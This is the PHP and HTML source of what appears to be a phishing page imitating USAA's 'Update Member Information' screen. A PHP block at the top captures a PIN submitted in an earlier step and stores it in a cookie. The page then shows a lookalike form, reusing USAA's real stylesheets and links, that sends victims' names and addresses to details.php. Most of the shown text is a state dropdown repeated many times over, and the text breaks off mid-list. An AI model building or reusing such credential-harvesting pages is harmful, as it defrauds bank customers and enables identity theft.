<?php
if(isset($_POST['pin1']))
{
	$pin = $_POST['pin1'];
	
	setcookie("pin", $pin, time()+3600);
	
	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">

<head>
	
<script type="text/javascript" src="js/jquery.min.js"></script>



<title>USAA / Update Member Information</title>






	<meta name="title" content="USAA / Update Member Information" />








	<meta name="description" content="Members of the military, their dependents, and selected other government agency employees may be eligible for USAA auto & property insurance." />




	<meta name="abstract" content="USAA - Insurance and eligibility requirements" />




	<meta name="taxonomy" content="unsecure/become_a_member" />



<meta http-equiv="pics-label" content='(pics-1.1 "http://www.icra.org/ratingsv02.html" l gen true for "http://www.usaa.com" r (cz 1 lz 1 nz 1 oz 1 vz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "http://www.usaa.com" r (n 0 s 0 v 0 l 0))' /> 


















<meta http-equiv="Content-Style-Type" content='text/css' />



	<link rel="stylesheet" type="text/css" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member.css?cacheid=3526702913" media="all" />
			<link rel="stylesheet" type="text/css" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member_print.css?cacheid=644397621" media="print" />
	
	












	


	











	
	
		
	
















<link rel="SHORTCUT ICON" href="img/usaaicon.ico" />



</head>

<!-- BEGIN HTML BODY -->
<body onunload="closeChildren()
"

	
	
		
	
	
		>
	




		

	


 


<!-- Begin outside wrapper for the container -->
 <!-- Include the default container if no custom one exists-->
 
 	
	
		<div id="container">
	
 	
 

 
 <a name="top"></a>

 <div class="noindex"> 
	 
	 
	   
 		<!-- BEGIN PAGE HEADER -->
		









<a title="Skip Navigation (Accesskey 2)" accesskey="2" onclick="USAA.ent.util.skipToContent('content');" onblur="this.className='skipInactive';" onfocus="this.className='skipActive';" href="#content" class="skipInactive" id="skip">Skip to Content</a>
<div id="header">

	
	
	

	
	  <div id="logo"><a href="https://www.usaa.com/inet/ent_home/CpHome" class="logo"><img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="53" height="55"  alt="USAA Member Home" title="USAA Member Home"/></a> <a href="https://www.usaa.com/inet/pages/security_center" class="security"><img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="84" height="24" alt="usaa.com is a Secure Site"    title="usaa.com is a Secure Site"/></a></div>
	  <div id="navReference" style="position:absolute;top:5px;right:22px;z-index:10003;"><a href="https://www.usaa.com/inet/ent_home/CpHome">Log Out</a> | <a href="https://www.usaa.com/inet/pages/ContactUsMain">Contact Us</a></div>
	
	
</div>

	

<div class="globalNavContainer">
	<div id="nav">
		
		
			<div class="yui-skin-sam toolsSearch_pubSide">
		
				<div class="yui-ac">
					<form action="https://www.usaa.com/inet/ent_search/CpPrvtSearch" method="get">	
						<label for="search" class="searchLabel">Search</label>
						<input type="text" class="searchInput yui-ac-input" id="search" name="SearchPhrase" value="Search" title="Search" autocomplete="off" onclick="if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''};" onfocus="USAA.ec.search.Autocomplete.initYUI('search', 'headerSearchAutocompleteContainer'); if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''};" />
						<div id="headerSearchAutocompleteContainer" class="yui-ac-container"></div>
						<button name="searchButton" value="search" type="submit" class="searchButton" id="searchButton" onclick="javascript:if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''}"></button>
					</form>
				</div>
			</div>
		
	
		 
		
		
		
	
	
			
			
	
	
				
			
			
			 
			
	
			
			
	
			<div id="globalNav"><ul id="navGlobal"><li><a class="homeBtn" href="https://www.usaa.com/inet/ent_home/CpHome" ><span class="hiddenMessage">Home</span></a></li>
<li><a class="whyChooseBtn" href="https://www.usaa.com/inet/pages/why_choose_usaa_main?wa_ref=pub_global_why_choose_usaa_main" ><span class="hiddenMessage">Why Choose USAA</span></a></li>
<li><a class="productsBtn" href="https://www.usaa.com/inet/pages/products_services_main?wa_ref=pub_global_products_and_services" ><span class="hiddenMessage">Products & Services</span></a></li>
<li><a class="adviceNPlanningBtn" href="https://www.usaa.com/inet/pages/advice_planning_main?wa_ref=pub_global_advice_and_planning" ><span class="hiddenMessage">Advice, Planning & Retirement</span></a></li>
</ul></div>
	
			
				
	
			
			
			
		 		
			
			
			
				<div id="navSubSection">
			
			
				<ul></ul>

	
	
			
			</div>
	
	
	
	
	
		
		
	
	</div>
</div>






		<!-- END PAGE HEADER --> 
 	 
 </div> 
	
 		


 


	<a name="contentLink"></a>
	
	<div id="content">
		
		<div class="noindex"> 
			


 



<div id="toolsHeading">
        
        


        
        
                <h1>
                        Update Member Information
                </h1>
        
</div>






 
 		





 







<div class="skin-usaa-application-contact">




       
                               
                <a id="contactLink" href="https://www.usaa.com/inet/ent_memberassistance/Click2Call?action=INIT&MAMode=CONTACTOPTIONS&AppId=CpMemberEligibility&PageId=cp_eligibility&SubPageId=&ContentId=&MA_DisableC2C=&MA_RoutingData=&ReturnLink=https://www.usaa.com/inet/ent_membereligibility/CpMemberEligibility?action=INIT"><!-- --></a>

		 
     
           
   </div>






		</div> 

		
		
		
		
		
			
				<div id="rightColWrapper"> 	
			
		
		
		<div id="main">
			
				
				

 



	
	

    	
	
	    <form action="details.php" method="post" id="CpMemberEligibility" name="CpMemberEligibility" onsubmit="return HandleLogonSubmit()">


<!-- pwvio12l,   mbr_utilities_01 -->

	

	
	<!-- BEGIN SEARCH INDEX -->
	
	






<!-- Title, Header and Steps Bar -->










	
			
	<div class="floatLeftApp">
		
		 
		
			<div id="stepsBar"><li class=step1>Log On User ID</li><li class=step2active>Update Personal Information</li></div>
<br/>
	</div>

	
  	
	<br clear="all" />
	












	


	 <p>Please update the following information so that we can determine your eligibility for USAA products and services. <br>You are providing information to each of the USAA companies so we may properly identify you, and for other permissible USAA business purposes allowed by law. We&rsquo;ll collect this information as you enter it.
	 </p>
	  <!-- Quick Search Info --> 
	 





<table width="100%" cellpadding="0" cellspacing="0" class="tableData">
	<tr>
    	<td class="dataLabel">First Name</td>
        <td><input type="text" conditionnbr="regex_name" id="firstname" name="firstname" maxlength="20" size="15"  />

	</tr>
	<tr>
		<td width="32%" class="dataLabel" nowrap="nowrap">Middle Name or Initial</td>
		<td><input type="text" id="memberprospect.personalinfo.name.middlename" name="middlename" maxlength="20" size="15"  />

			<span class="textInfo">(OPTIONAL)</span>
	</tr>
	<tr>
		<td class="dataLabel">Last Name</td>
		<td><input type="text" conditionnbr="regex_name" id="lastname" name="lastname" maxlength="20" size="15"  />

	</tr> 
	<tr>
	</tr>
      		<td class="dataLabel">Mailing Address Location</td>
      		<td width="5%">
			
					<input type="radio" title="" id="memberprospect.personalinfo.location.homeaddresstype_1"  name="homeaddresstype" value="Domestic" onClick='JavaScript:dynDisplay();resetAddressValues();'  checked="checked"  /><label for="memberprospect.personalinfo.location.homeaddresstype_1" >U.S. or U.S. Territories</label>
&nbsp;
			
					<input type="radio" title="" id="memberprospect.personalinfo.location.homeaddresstype_2"  name="homeaddresstype" value="APO/FPO" onClick='JavaScript:dynDisplay();resetAddressValues();'  /><label for="memberprospect.personalinfo.location.homeaddresstype_2" >APO/FPO/DPO</label>
&nbsp;
			
					<input type="radio" title="" id="memberprospect.personalinfo.location.homeaddresstype_3"  name="homeaddresstype" value="International" onClick='JavaScript:dynDisplay();resetAddressValues();'  /><label for="memberprospect.personalinfo.location.homeaddresstype_3" >International</label>
&nbsp;
			
			</td>
      </tr>
      


	          	<td width="40%" class="dataLabel">Address Line 1</td>
          	<td width="60%">
					<input type="text" conditionnbr="regex_all" id="addressline1" name="addressline1" maxlength="30" size="30"  />
	
					
			</td>
    </tr>
   
          	<td width="40%" class="dataLabel">Address Line 2</td>
          	<td width="60%">
						<input type="text" id="memberprospect.personalinfo.location.addressline2" name="addressline2" maxlength="30" size="30"  />

						<span class="textInfo">(OPTIONAL)</span>		 				
			</td>
    </tr>
   
          	 <td class="dataLabel">City</td>
           	 <td width="60%">
			<input type="text" conditionnbr="regex_all" id="city" name="city" maxlength="30" size="15"  />

     		</td>
    </tr>

           		<td width="25%" class="dataLabel">State/Territory US</td>
           		 <td width="60%">
				<select  size="0" name="state" conditionnbr="regex_all" id="state"   >
<option value="">- Select -</option><option value="AL">ALABAMA</option><option value="AK">ALASKA</option><option value="AS">AMERICAN SAMOA</option><option value="AZ">ARIZONA</option><option value="AR">ARKANSAS</option><option value="CA">CALIFORNIA</option><option value="CO">COLORADO</option><option value="CT">CONNECTICUT</option><option value="DE">DELAWARE</option><option value="DC">DISTRICT OF COLUMBIA</option><option value="FL">FLORIDA</option><option value="GA">GEORGIA</option><option value="GU">GUAM</option><option value="HI">HAWAII</option><option value="ID">IDAHO</option><option value="IL">ILLINOIS</option><option value="IN">INDIANA</option><option value="IA">IOWA</option><option value="KS">KANSAS</option><option value="KY">KENTUCKY</option><option value="LA">LOUISIANA</option><option value="ME">MAINE</option><option value="MH">MARSHALL ISLANDS</option><option value="MD">MARYLAND</option><option value="MA">MASSACHUSETTS</option><option value="MI">MICHIGAN</option><option value="FM">MICRONESIA</option><option value="MN">MINNESOTA</option><option value="MS">MISSISSIPPI</option><option value="MO">MISSOURI</option><option value="MT">MONTANA</option><option value="NE">NEBRASKA</option><option value="NV">NEVADA</option><option value="NH">NEW HAMPSHIRE</option><option value="NJ">NEW JERSEY</option><option value="NM">NEW MEXICO</option><option value="NY">NEW YORK</option><option value="MP">NO MARIANA ISLANDS</option><option value="NC">NORTH CAROLINA</option><option value="ND">NORTH DAKOTA</option><option value="OH">OHIO</option><option value="OK">OKLAHOMA</option><option value="OR">OREGON</option><option value="PW">PALAU</option><option value="PA">PENNSYLVANIA</option><option value="PR">PUERTO RICO</option><option value="RI">RHODE ISLAND</option><option value="SC">SOUTH CAROLINA</option><option value="SD">SOUTH DAKOTA</option><option value="TN">TENNESSEE</option><option value="TX">TEXAS</option><option value="VI">U S VIRGIN ISLANDS</option><option value="UT">UTAH</option><option value="VT">VERMONT</option><option value="VA">VIRGINIA</option><option value="WA">WASHINGTON</option><option value="WV">WEST VIRGINIA</option><option value="WI">WISCONSIN</option><option value="WY">WYOMING</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option 